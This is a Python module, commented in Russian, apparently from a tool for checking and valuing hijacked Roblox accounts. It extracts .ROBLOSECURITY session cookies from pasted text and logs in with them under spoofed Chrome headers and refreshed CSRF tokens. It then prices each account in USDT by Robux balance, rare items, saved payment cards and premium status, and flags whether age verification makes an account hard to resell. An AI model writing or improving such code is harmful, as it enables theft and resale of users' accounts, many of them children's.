import re
import time
import urllib.parse
import logging
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from config import (
    RARE_ITEM_PATTERNS, PRICE_PER_1K_ROBUX, PRICE_GROUP_DISCOUNT, 
    PRICE_PER_1K_RAP, PRICE_RAP_MIN, PRICE_KORBLOX, PRICE_KORBLOX_DISCOUNT, 
    PRICE_HEADLESS, PRICE_HEADLESS_DISCOUNT, PRICE_COMBO, PRICE_COMBO_DISCOUNT, 
    PRICE_PREMIUM, PRICE_ACTIVE_MIN_MINUTES
)

logger = logging.getLogger(__name__)

def extract_cookies(text: str) -> list:
    if not text:
        return []
    text = urllib.parse.unquote(text)
    cookies = []
    for match in re.finditer(r'\.?ROBLOSECURITY\s*[=:]\s*([^\s;]+)', text, re.IGNORECASE):
        c = match.group(1).strip('"\';')
        if len(c) > 100 and c not in cookies:
            cookies.append(c)
    for match in re.finditer(r'_\|WARNING[^|]*\|_\S{80,}', text):
        c = match.group(0).strip('"\'')
        if len(c) > 100 and c not in cookies:
            cookies.append(c)
    if not cookies:
        for line in text.splitlines():
            line = line.strip().strip('"\';')
            if len(line) > 100 and len(line) < 4000 and line not in cookies:
                cookies.append(line)
    return cookies

def fetch_csrf_token(session: requests.Session) -> str | None:
    """Получает валидный X-CSRF-TOKEN отправкой пустой POST-пробы"""
    try:
        resp = session.post('https://auth.roblox.com/v2/login', timeout=10)
        csrf_token = resp.headers.get('x-csrf-token')
        if csrf_token:
            logger.info(f"🔑 Успешно получен X-CSRF-TOKEN: {csrf_token[:10]}...")
            return csrf_token
        logger.warning("⚠️ Не удалось извлечь X-CSRF-TOKEN из заголовков ответа.")
    except Exception as e:
        logger.error(f"❌ Ошибка при получении X-CSRF-TOKEN: {e}")
    return None

def create_session(cookie: str) -> requests.Session:
    s = requests.Session()
    
    clean_cookie = cookie.strip()
    if clean_cookie.startswith('.ROBLOSECURITY='):
        clean_cookie = clean_cookie[15:]
        
    s.headers.update({
        'Cookie': f'.ROBLOSECURITY={clean_cookie}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Origin': 'https://www.roblox.com',
        'Referer': 'https://www.roblox.com/',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Sec-Ch-Ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site'
    })
    
    retry_strategy = Retry(
        total=2,
        backoff_factor=1,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["GET", "POST"]
    )
    adapter = HTTPAdapter(pool_connections=20, pool_maxsize=20, max_retries=retry_strategy)
    s.mount('https://', adapter)
    s.mount('http://', adapter)
    
    # Сразу получаем CSRF-Токен для сессии
    csrf = fetch_csrf_token(s)
    if csrf:
        s.headers['X-CSRF-TOKEN'] = csrf
        
    return s

def make_request(session: requests.Session, method: str, url: str, retries: int = 3, timeout: int = 15, **kwargs) -> requests.Response | None:
    for attempt in range(1, retries + 1):
        try:
            resp = session.request(method, url, timeout=timeout, **kwargs)
            logger.info(f"🌐 [{method}] {url} -> Status: {resp.status_code}")
            
            # Обработка обновления CSRF токена если Roblox его потребовал (403 Token Validation Failed)
            if resp.status_code == 403 and 'x-csrf-token' in resp.headers:
                new_csrf = resp.headers.get('x-csrf-token')
                logger.info(f"🔄 Обновление X-CSRF-TOKEN с 403 ответа: {new_csrf[:10]}...")
                session.headers['X-CSRF-TOKEN'] = new_csrf
                # Повторяем запрос с новым токеном
                resp = session.request(method, url, timeout=timeout, **kwargs)
                logger.info(f"🌐 [RETRY-{method}] {url} -> Status: {resp.status_code}")
            
            if resp.status_code == 429:
                logger.warning(f"⚠️ Rate limit (429) on {url}. Ожидание ({attempt}/{retries})...")
                time.sleep(3 * attempt)
                continue
                
            if resp.status_code == 200:
                return resp
            else:
                logger.warning(f"⚠️ Статус {resp.status_code} для {url}. Ответ: {resp.text[:200]}")
                if resp.status_code in [401]:
                    # Точно невалидная кука
                    break
        except requests.RequestException as e:
            logger.error(f"❌ Ошибка запроса {url} (Попытка {attempt}/{retries}): {e}")
            if attempt < retries:
                time.sleep(2)
    return None

def is_rare_item(name: str) -> bool:
    name_lower = name.lower()
    for pattern in RARE_ITEM_PATTERNS:
        if pattern in name_lower:
            return True
    return False

def compute_account_price(info: dict) -> float:
    """Оценка аккаунта в USDT"""
    price = 0.0
    balance = info.get('Robux', 0) or 0
    groups_balance = info.get('GroupsBalance', 0) or 0
    rap = info.get('TotalRAP', 0) or 0
    
    price += balance / 1000 * PRICE_PER_1K_ROBUX
    price += groups_balance / 1000 * PRICE_PER_1K_ROBUX * PRICE_GROUP_DISCOUNT
    
    if rap >= PRICE_RAP_MIN:
        price += rap / 1000 * PRICE_PER_1K_RAP
    
    has_billing = (info.get('BillingRobux', 0) or 0) > 0 or (info.get('CardCount', 0) or 0) > 0
    total_pt = info.get('TotalPlaytime', 0) or 0
    is_active = total_pt > PRICE_ACTIVE_MIN_MINUTES
    discount = has_billing and is_active
    
    kb = info.get('HasKorblox', False)
    hl = info.get('HasHeadless', False)
    
    if kb and hl:
        price += PRICE_COMBO_DISCOUNT if discount else PRICE_COMBO
    elif kb:
        price += PRICE_KORBLOX_DISCOUNT if discount else PRICE_KORBLOX
    elif hl:
        price += PRICE_HEADLESS_DISCOUNT if discount else PRICE_HEADLESS
    
    if info.get('Premium', False) and rap > 0:
        price += PRICE_PREMIUM
    
    return round(price, 2)

def is_unpassable(info: dict) -> bool:
    """Passable/Unpassable по ID верификации"""
    if not info.get('IsAgeVerified', False):
        return False
    bracket = info.get('VerifiedAgeBracket')
    if bracket in ('Under13', 'Over13'):
        return True
    if bracket == 'Over18':
        return not info.get('CanResetAgeVerif', False)
    return True